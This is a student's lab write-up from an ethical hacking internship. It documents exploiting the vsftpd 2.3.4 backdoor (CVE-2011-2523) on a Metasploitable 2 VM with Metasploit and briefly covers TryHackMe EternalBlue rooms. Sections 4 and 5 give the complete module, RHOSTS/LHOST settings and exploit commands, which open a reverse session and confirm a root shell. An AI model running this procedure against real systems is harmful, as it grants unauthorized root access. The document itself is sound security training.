# Week 6, Task 1 — Metasploit: Exploiting a Vulnerable Machine

<p align="center">
  <img src="https://img.shields.io/badge/Task-01-404040?style=flat-square&labelColor=6366F1" alt="Task 1" />
  <img src="https://img.shields.io/badge/Tool-Metasploit-404040?style=flat-square&labelColor=C00000" alt="Metasploit" />
  <img src="https://img.shields.io/badge/Lab-Metasploitable%202-404040?style=flat-square&labelColor=238F89" alt="Metasploitable 2" />
</p>

**Internship:** Ethical Hacking Internship, TechBiz Academy  
**Author:** Collins Okike  
**Attacker:** Kali Linux — `10.0.0.3`  
**Target:** Metasploitable 2 — `10.0.0.6`  
**Network:** VirtualBox NAT Network (`NatNetwork`)

## 1. Introduction

For this task I moved from identifying a vulnerable service to testing whether it could actually be used to gain access. I used Metasploit on Kali Linux to check a vulnerable FTP service running on my Metasploitable 2 virtual machine. The service was `vsftpd 2.3.4`, and the module I tested was the known backdoor module for that specific version.

I had already worked with Nmap in an earlier week, so I could connect the two exercises. Nmap helps me identify which services are running and what versions they report. Metasploit then gives me a way to load and test a matching exploit module. I kept this activity inside my VirtualBox lab, where the Kali attacker and Metasploitable target were on the same private NAT Network.

The aim was not just to see a success message in Metasploit. I also wanted to confirm that a session had opened, enter the system shell and check which account the session was running as.

## 2. Lab setup and target details

| Item | Details |
|---|---|
| Attacking machine | Kali Linux, `10.0.0.3` |
| Target machine | Metasploitable 2, `10.0.0.6` |
| Network | VirtualBox `NatNetwork`, `10.0.0.0/24` |
| Target service | FTP on TCP port `21` |
| Service version | `vsftpd 2.3.4` |
| Exploit module | `exploit/unix/ftp/vsftpd_234_backdoor` |
| Vulnerability reference | CVE-2011-2523 |
| Tool | Metasploit Framework (`msfconsole`) |

The vulnerable FTP service was part of the intentionally insecure Metasploitable 2 machine. I did not run this against a public FTP server or a system outside my lab.

## 3. Understanding the Metasploit terms

Before running the module, I reviewed what the main terms meant. This made the options easier to understand instead of treating them as commands I had to memorise.

| Term | What it means in this exercise |
|---|---|
| **Module** | A component in Metasploit for a particular task, such as an exploit, scanner or auxiliary check. |
| **Exploit** | Code that takes advantage of a vulnerability in the target service. |
| **Payload** | The code or action that runs after exploitation succeeds. In this lab, the result was a session back to Kali. |
| **RHOSTS** | The remote host or target address. I set this to the Metasploitable 2 IP. |
| **LHOST** | The local address the target should connect back to for a reverse connection. I set this to Kali's lab IP. |
| **Session** | The active connection Metasploit creates after a successful exploit. |
| **Meterpreter** | A Metasploit session interface that provides commands for interacting with a compromised machine. |

The two IP settings are easy to mix up. `RHOSTS` is the machine I am testing, while `LHOST` is my own Kali machine. In a reverse connection, the target needs to reach the attacker's listening address, so using the wrong local interface can prevent the session from connecting.

## 4. Running the Metasploit workflow

### 4.1 Start Metasploit and search for the service

I opened a terminal in Kali and started the Metasploit console:

```bash
msfconsole
```

At the Metasploit prompt, I searched for modules related to the FTP service:

```text
search vsftpd
```

The search returned `exploit/unix/ftp/vsftpd_234_backdoor`, described as **VSFTPD 2.3.4 Backdoor Command Execution**. The result showed an excellent module rank and listed Linux/Unix command and backdoor command-shell targets.

![Metasploit search results for the vsftpd 2.3.4 backdoor module](screenshots/01-msfconsole-search-vsftpd.jpg)

The version in the module name matched the version running on the target. That match mattered: I should not select an exploit simply because the service name looks similar. I first need to compare the detected product and version with what the module is designed to affect. The search result gave me a candidate module; the next step was to inspect its options before running it.

### 4.2 Load the module and inspect its options

I loaded the module and displayed the required settings:

```text
use exploit/unix/ftp/vsftpd_234_backdoor
show options
```

`use` changed the Metasploit prompt to the selected exploit module. `show options` displayed the settings that needed to be supplied. I then set the target address:

```text
set RHOSTS 10.0.0.6
```

My first attempt stopped at the validation stage because I had not set `LHOST`. Metasploit reported: `One or more options failed to validate: LHOST.` This was useful because it showed that the module needed a local callback address as well as the target address. I checked the network details I had recorded for the lab and set Kali's address:

```text
set LHOST 10.0.0.3
```

### 4.3 Run the exploit and read the result

After configuring both addresses, I ran the module again:

```text
exploit
```

Metasploit started a reverse TCP handler on `10.0.0.3:4444`. The FTP banner identified the service as `vsFTPd 2.3.4`; the module reported that the target appeared vulnerable and that the backdoor had been spawned. It then opened Meterpreter session 1, showing the connection from Kali to the target.

![Metasploit options, RHOSTS and LHOST settings, and successful exploit output](screenshots/02-msfconsole-options-rhosts-lhost-exploit.png)

This was the point where I knew the exploit had progressed beyond a version match. A session had actually opened. The handler was listening on Kali, and the target connected back to it. I still needed to confirm what access the session provided, because a session opening does not by itself tell me which user privileges I have.

## 5. Confirming the level of access

The session opened in Meterpreter. I initially tried to use normal Linux commands directly, but `whoami` and `id` are not Meterpreter commands. I switched from the Meterpreter interface to the target's operating-system shell with:

```text
shell
```

Then I ran:

```bash
whoami
id
```

The shell returned `root` for `whoami`. The `id` command returned `uid=0(root) gid=0(root)`, confirming that the session was running with the root account's privileges.

![Target shell showing whoami as root and uid 0 from id](screenshots/03-meterpreter-shell-root-whoami-id.png)

This distinction is important. `whoami` tells me the current username, while `id` also shows the numeric user and group identifiers. On Linux, UID `0` is the root account. The result therefore confirmed that this particular vulnerable service gave me root-level command execution without needing a separate privilege-escalation step.

## 6. TryHackMe practice

I also completed two TryHackMe exercises that helped me understand how Metasploit is used in different situations.

### 6.1 Metasploit: Introduction

In this room I practised the normal Metasploit sequence: search for a module, load it with `use`, inspect it with `show options`, configure the required values and run it. The room used the MS17-010 EternalBlue vulnerability as its example. I also learned how payload names indicate whether a payload is staged or delivered as a single unit.

![TryHackMe Metasploit Introduction room completed](screenshots/04-tryhackme-metasploit-introduction-completed.png)

What helped me most was seeing that the same console workflow can be used for different services and vulnerabilities. The exact module and options change, but the habit of checking the module details before running it stays the same.

### 6.2 Blue

The Blue room gave me more practice with the EternalBlue/SMBv1 attack path on a Windows target. I worked through the process of gaining an initial session, moving to Meterpreter, checking privileges and continuing with post-exploitation tasks. The exercise also covered credential recovery and locating the flags in the lab.

![TryHackMe Blue room completed](screenshots/05-tryhackme-blue-completed.jpg)

It helped me understand that exploitation is not the end of a penetration test. After an initial session, a tester still needs to establish what access was gained, what systems or data that access exposes, and what evidence is appropriate to collect. In a real engagement, these actions must remain within the agreed scope.

## 7. Problems I faced and how I fixed them

| Problem | What happened | How I resolved it |
|---|---|---|
| Missing `LHOST` | The first run failed validation with an LHOST error. | I set `LHOST` to Kali's lab address, `10.0.0.3`, and ran the module again. |
| Linux commands were not recognised at the Meterpreter prompt | `whoami` and `id` were treated as unknown Meterpreter commands. | I used `shell` to enter the system shell, then ran the commands there. |

I learned not to assume that every prompt is a normal Linux terminal. The command set depends on which interface I am currently using. I also learned to read the module's validation messages instead of repeatedly running the same command without checking the missing setting.

## 8. Conclusion

This task gave me practical experience with the full Metasploit process, from searching for a module that matched a service version to confirming the privileges of the resulting session. I used `RHOSTS` for the target and `LHOST` for my Kali callback address, corrected the missing LHOST setting, and confirmed root access with both `whoami` and `id`.

The main lesson I took from this exercise is that a successful exploit needs to be verified. The session message showed that Metasploit connected, but the shell and identity checks showed what level of access I actually obtained. It also reinforced why vulnerable services should be patched or removed, why exposed services need to be reviewed, and why exploitation should only be carried out against systems for which permission has been given.
